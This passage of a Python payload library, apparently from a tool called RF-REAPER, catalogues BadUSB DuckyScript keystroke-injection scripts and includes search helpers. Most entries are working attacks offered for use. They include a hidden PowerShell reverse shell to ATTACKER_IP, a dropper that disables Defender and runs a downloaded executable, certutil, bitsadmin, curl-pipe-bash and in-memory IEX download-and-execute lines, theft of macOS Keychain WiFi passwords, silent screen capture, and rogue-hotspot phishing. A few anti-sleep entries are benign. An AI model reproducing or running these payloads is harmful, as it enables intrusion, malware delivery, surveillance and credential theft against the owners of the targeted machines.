                "script": "DELAY 500\nGUI r\nDELAY 200\nSTRING powershell -w h\nENTER\nDELAY 300\nSTRING netsh wlan show networks mode=bssid | Out-File $env:TEMP\\\\nearby_wifi.txt\nENTER"
            },
            "wifi_mac_extract": {
                "name": "macOS WiFi Password",
                "os": "macos",
                "description": "Extracts WiFi password from macOS Keychain",
                "source": "avltree9798/macos_badkb_scripts",
                "script": "DELAY 500\nID 05ac:021e Apple:Keyboard\nGUI SPACE\nDELAY 300\nSTRING Terminal\nENTER\nDELAY 500\nSTRING  security find-generic-password -D 'AirPort network password' -wa 'TARGET_SSID' 2>/dev/null > /tmp/.wp\nENTER"
            },
        }
    },

    # ═══════════════════════════════════════════════════════════
    # DIGISPARK — ATtiny85/DigiSpark specific payloads
    # ═══════════════════════════════════════════════════════════
    "digispark": {
        "name": "🔌 DigiSpark",
        "description": "ATtiny85 DigiSpark-compatible payloads",
        "payloads": {
            "digispark_revshell": {
                "name": "DigiSpark Reverse Shell",
                "os": "windows",
                "description": "Opens hidden PS reverse shell via DigiSpark timing",
                "source": "mishqatabid/DigiSpark-Scripts + neogret",
                "script": "DELAY 3000\nGUI r\nDELAY 500\nSTRING powershell -w h -nop -ep bypass\nENTER\nDELAY 1000\nSTRING $c=New-Object Net.Sockets.TcpClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)};$c.Close()\nENTER"
            },
            "digispark_wifi_grab": {
                "name": "DigiSpark WiFi Grabber",
                "os": "windows",
                "description": "Quick WiFi grab optimized for DigiSpark timing",
                "source": "mishqatabid + mcore1976/badUSB",
                "script": "DELAY 3000\nGUI r\nDELAY 800\nSTRING cmd /k netsh wlan show profiles\nENTER"
            },
            "digispark_payload_drop": {
                "name": "DigiSpark Dropper",
                "os": "windows",
                "description": "Downloads and executes payload with Defender bypass",
                "source": "neogret/DigiSparkBadUSB + mcore1976",
                "script": "DELAY 3000\nGUI r\nDELAY 800\nSTRING powershell -w h -ep bypass -c \"Set-MpPreference -DisableRealtimeMonitoring $true; iwr 'PAYLOAD_URL' -o $env:TEMP\\\\s.exe; Start-Process $env:TEMP\\\\s.exe\"\nENTER"
            },
        }
    },

    # ═══════════════════════════════════════════════════════════
    # SCREEN CAPTURE — Based on DScreen + community
    # ═══════════════════════════════════════════════════════════
    "screen_capture": {
        "name": "🖥️ Screen Capture",
        "description": "Screenshots and screen recording payloads",
        "payloads": {
            "multi_screenshot": {
                "name": "Multi-Monitor Screenshot",
                "os": "windows",
                "description": "Captures all monitors and saves to temp",
                "source": "dagnazty/DScreen",
                "script": "DELAY 500\nGUI r\nDELAY 200\nSTRING powershell -w h -ep bypass\nENTER\nDELAY 300\nSTRING Add-Type -A System.Windows.Forms,System.Drawing;$i=0;[Windows.Forms.Screen]::AllScreens|ForEach{$b=New-Object Drawing.Bitmap($_.Bounds.Width,$_.Bounds.Height);$g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($_.Bounds.Location,[Drawing.Point]::Empty,$_.Bounds.Size);$b.Save(\"$env:TEMP\\\\screen_$i.png\");$i++}\nENTER"
            },
            "timed_screenshots": {
                "name": "Timed Screenshot Loop",
                "os": "windows",
                "description": "Takes screenshots every 10 seconds for 2 minutes",
                "source": "DScreen concepts",
                "script": "DELAY 500\nGUI r\nDELAY 200\nSTRING powershell -w h -ep bypass\nENTER\nDELAY 300\nSTRING Add-Type -A System.Windows.Forms,System.Drawing;1..12|ForEach{$b=New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);$g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen([Drawing.Point]::Empty,[Drawing.Point]::Empty,$b.Size);$b.Save(\"$env:TEMP\\\\ss_$(Get-Date -f 'HHmmss').png\");Start-Sleep 10}\nENTER"
            },
            "screenshot_mac": {
                "name": "macOS Silent Screenshot",
                "os": "macos",
                "description": "Takes silent screenshot without shutter sound",
                "source": "narstybits + avltree9798",
                "script": "DELAY 500\nID 05ac:021e Apple:Keyboard\nGUI SPACE\nDELAY 300\nSTRING Terminal\nENTER\nDELAY 500\nSTRING  screencapture -x /tmp/.ss.png\nENTER\nDELAY 200\nSTRING  exit\nENTER"
            },
        }
    },

    # ═══════════════════════════════════════════════════════════
    # ANTI-AFK — Keep systems alive
    # ═══════════════════════════════════════════════════════════
    "anti_afk": {
        "name": "☕ Anti-AFK",
        "description": "Keep systems from going to sleep/locking",
        "payloads": {
            "mouse_jiggler": {
                "name": "Mouse Jiggler (PS)",
                "os": "windows",
                "description": "Moves mouse cursor every 30 seconds to prevent sleep",
                "source": "infomanc3r/BadUSB-Anti-AFK",
                "script": "DELAY 500\nGUI r\nDELAY 200\nSTRING powershell -w h\nENTER\nDELAY 300\nSTRING Add-Type -A System.Windows.Forms;while($true){$p=[Windows.Forms.Cursor]::Position;[Windows.Forms.Cursor]::Position=New-Object Drawing.Point($p.X+1,$p.Y);Start-Sleep -M 100;[Windows.Forms.Cursor]::Position=$p;Start-Sleep 30}\nENTER"
            },
            "scroll_lock_toggle": {
                "name": "Scroll Lock Toggle",
                "os": "windows",
                "description": "Toggles Scroll Lock key periodically (invisible AFK)",
                "source": "Anti-AFK community",
                "script": "DELAY 500\nGUI r\nDELAY 200\nSTRING powershell -w h\nENTER\nDELAY 300\nSTRING $w=New-Object -ComObject WScript.Shell;while($true){$w.SendKeys('{SCROLLLOCK}');Start-Sleep -M 100;$w.SendKeys('{SCROLLLOCK}');Start-Sleep 240}\nENTER"
            },
            "anti_afk_mac": {
                "name": "macOS Caffeinate",
                "os": "macos",
                "description": "Prevents macOS from sleeping using caffeinate",
                "source": "Community",
                "script": "DELAY 500\nGUI SPACE\nDELAY 300\nSTRING Terminal\nENTER\nDELAY 500\nSTRING caffeinate -d -i -m -u &\nENTER\nDELAY 200\nSTRING exit\nENTER"
            },
        }
    },

    # ═══════════════════════════════════════════════════════════
    # EVIL PORTAL — Captive portal attacks
    # ═══════════════════════════════════════════════════════════
    "evil_portal": {
        "name": "🎣 Evil Portal",
        "description": "Captive portal and phishing via WiFi",
        "payloads": {
            "hotspot_phish": {
                "name": "Create Rogue Hotspot",
                "os": "linux",
                "description": "Creates open WiFi hotspot for credential capture",
                "source": "fxip/evilportal + WIFROG",
                "script": "DELAY 500\nCTRL ALT t\nDELAY 500\nSTRING sudo bash -c 'nmcli dev wifi hotspot ifname wlan0 ssid Free_WiFi password \"\" && iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080'\nENTER"
            },
            "wifi_portal_win": {
                "name": "Windows Hosted Network",
                "os": "windows",
                "description": "Creates hosted network for evil twin attack",
                "source": "Evil portal concepts",
                "script": "DELAY 500\nGUI r\nDELAY 200\nSTRING cmd /k netsh wlan set hostednetwork mode=allow ssid=Corporate_WiFi key=password123 && netsh wlan start hostednetwork\nENTER"
            },
        }
    },

    # ═══════════════════════════════════════════════════════════
    # DOWNLOAD & EXECUTE — Payload delivery
    # ═══════════════════════════════════════════════════════════
    "download_exec": {
        "name": "💾 Download & Execute",
        "description": "Remote payload download and execution",
        "payloads": {
            "certutil_download": {
                "name": "CertUtil Download (LOLBin)",
                "os": "windows",
                "description": "Uses certutil.exe to download payload (Living Off The Land)",
                "source": "cyberartemio/badusb-payloads + THC",
                "script": "DELAY 500\nGUI r\nDELAY 200\nSTRING cmd /c certutil -urlcache -split -f \"PAYLOAD_URL\" %TEMP%\\\\update.exe && %TEMP%\\\\update.exe\nENTER"
            },
            "bitsadmin_download": {
                "name": "BITSAdmin Download (LOLBin)",
                "os": "windows",
                "description": "Uses bitsadmin for stealthy file download",
                "source": "Starvinci/BadUsb-Library + THC",
                "script": "DELAY 500\nGUI r\nDELAY 200\nSTRING powershell -w h\nENTER\nDELAY 300\nSTRING Start-BitsTransfer -Source 'PAYLOAD_URL' -Destination \"$env:TEMP\\\\svc.exe\"; Start-Process \"$env:TEMP\\\\svc.exe\" -WindowStyle Hidden\nENTER"
            },
            "curl_n_exec_linux": {
                "name": "curl + exec (Linux)",
                "os": "linux",
                "description": "Downloads and executes script on Linux",
                "source": "Community + THC-Archive",
                "script": "DELAY 500\nCTRL ALT t\nDELAY 500\nSTRING curl -sSL 'PAYLOAD_URL' | bash &\nENTER"
            },
            "memory_only_exec": {
                "name": "Memory-Only Execution",
                "os": "windows",
                "description": "Downloads and runs PowerShell payload entirely in memory",
                "source": "Jakoby + THC-Archive",
                "script": "DELAY 500\nGUI r\nDELAY 200\nSTRING powershell -w h -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('SCRIPT_URL')\"\nENTER"
            },
        }
    },
}

# ═══════════════════════════════════════════════════════════════
# DUCKYSCRIPT COMMAND REFERENCE (Extended)
# Based on analysis of all 46 repositories
# ═══════════════════════════════════════════════════════════════
DUCKY_COMMANDS = {
    # Standard DuckyScript 1.0
    "STRING": "Types a string of characters",
    "STRINGLN": "Types a string and presses ENTER (Flipper extension)",
    "DELAY": "Pauses execution in milliseconds",
    "ENTER": "Presses Enter key",
    "GUI": "Windows key / Command key",
    "WINDOWS": "Alias for GUI",
    "COMMAND": "Alias for GUI (macOS)",
    "ALT": "Alt key modifier",
    "CTRL": "Control key modifier",
    "CONTROL": "Alias for CTRL",
    "SHIFT": "Shift key modifier",
    "TAB": "Tab key",
    "ESCAPE": "Escape key",
    "SPACE": "Space key",
    "BACKSPACE": "Backspace key",
    "DELETE": "Delete key",
    "HOME": "Home key",
    "END": "End key",
    "INSERT": "Insert key",
    "PAGEUP": "Page Up key",
    "PAGEDOWN": "Page Down key",
    "UPARROW": "Up arrow (aliases: UP)",
    "DOWNARROW": "Down arrow (aliases: DOWN)",
    "LEFTARROW": "Left arrow (aliases: LEFT)",
    "RIGHTARROW": "Right arrow (aliases: RIGHT)",
    "CAPSLOCK": "Caps Lock key",
    "NUMLOCK": "Num Lock key",
    "SCROLLLOCK": "Scroll Lock key",
    "PRINTSCREEN": "Print Screen key",
    "PAUSE": "Pause key",
    "BREAK": "Break key",
    "F1": "F1 key", "F2": "F2 key", "F3": "F3 key", "F4": "F4 key",
    "F5": "F5 key", "F6": "F6 key", "F7": "F7 key", "F8": "F8 key",
    "F9": "F9 key", "F10": "F10 key", "F11": "F11 key", "F12": "F12 key",
    # DuckyScript 3.0 / Flipper extensions
    "REM": "Comment (ignored)",
    "REM_BLOCK": "Multi-line comment start",
    "END_REM": "Multi-line comment end",
    "REPEAT": "Repeat previous command N times",
    "DEFAULT_DELAY": "Set default delay between commands",
    "DEFAULTDELAY": "Alias for DEFAULT_DELAY",
    "ALTSTRING": "Types characters using Alt+numpad codes",
    "ALTCODE": "Single Alt+numpad code entry",
    "ALTCHAR": "Alias for ALTCODE",
    "WAIT_FOR_BUTTON_PRESS": "Flipper: Wait for button press",
    "LED": "Flipper: Control LED color",
    # USB Army Knife extensions
    "HOLD": "Hold a key down",
    "RELEASE": "Release held key",
    "BUTTON_DEF": "Define custom button mapping",
    "DISABLE_BUTTON": "Disable a button",
    # RF-REAPER extensions
    "ID": "Set USB VID:PID for device spoofing",
    "SYSRQ": "Send SysRq/Magic key (Linux kernel)",
}

# ═══════════════════════════════════════════════════════════════
# OS DETECTION PAYLOADS
# ═══════════════════════════════════════════════════════════════
OS_OPENERS = {
    "windows": {
        "terminal": "GUI r\nDELAY 300\nSTRING powershell -w h\nENTER\nDELAY 500",
        "admin_terminal": "GUI r\nDELAY 300\nSTRING powershell Start-Process powershell -Verb runAs\nENTER\nDELAY 500\nALT y\nDELAY 300",
        "browser": "GUI r\nDELAY 300",
    },
    "macos": {
        "terminal": "GUI SPACE\nDELAY 300\nSTRING Terminal\nDELAY 300\nENTER\nDELAY 500",
        "admin_terminal": "GUI SPACE\nDELAY 300\nSTRING Terminal\nDELAY 300\nENTER\nDELAY 500\nSTRING sudo su\nENTER\nDELAY 300",
        "browser": "GUI SPACE\nDELAY 300\nSTRING Safari\nENTER\nDELAY 500\nGUI l\nDELAY 200",
    },
    "linux": {
        "terminal": "CTRL ALT t\nDELAY 500",
        "admin_terminal": "CTRL ALT t\nDELAY 500\nSTRING sudo su\nENTER\nDELAY 300",
        "browser": "CTRL ALT t\nDELAY 500\nSTRING xdg-open\nDELAY 200",
    },
}

def get_all_payloads():
    """Return flat list of all payloads with category info"""
    all_p = []
    for cat_id, cat in PAYLOAD_LIBRARY.items():
        for pay_id, pay in cat.get('payloads', {}).items():
            all_p.append({
                'id': f'{cat_id}/{pay_id}',
                'category': cat['name'],
                'category_id': cat_id,
                **pay
            })
    return all_p

def get_payloads_by_os(os_name):
    """Return payloads filtered by OS"""
    return [p for p in get_all_payloads() if p.get('os','') == os_name]

def get_categories():
    """Return list of categories with counts"""
    return [{
        'id': k, 'name': v['name'], 'description': v['description'],
        'count': len(v.get('payloads', {}))
    } for k, v in PAYLOAD_LIBRARY.items()]

def search_payloads(query):
    """Search payloads by name, description, or script content"""
    q = query.lower()
    return [p for p in get_all_payloads()
            if q in p.get('name','').lower()
            or q in p.get('description','').lower()
            or q in p.get('script','').lower()]

# Quick stats
if __name__ == '__main__':
    total = sum(len(c.get('payloads',{})) for c in PAYLOAD_LIBRARY.values())
    print(f"⚡ RF-REAPER Payload Library v2.0")
    print(f"   Total payloads: {total}")
    print(f"   Categories: {len(PAYLOAD_LIBRARY)}")
    for cid, cat in PAYLOAD_LIBRARY.items():
        count = len(cat.get('payloads',{}))
        print(f"     {cat['name']}: {count} payloads")
    print(f"\n   DuckyScript commands supported: {len(DUCKY_COMMANDS)}")
    print(f"   OS targets: Windows, macOS, Linux")
    print(f"   Source repositories: 46+")
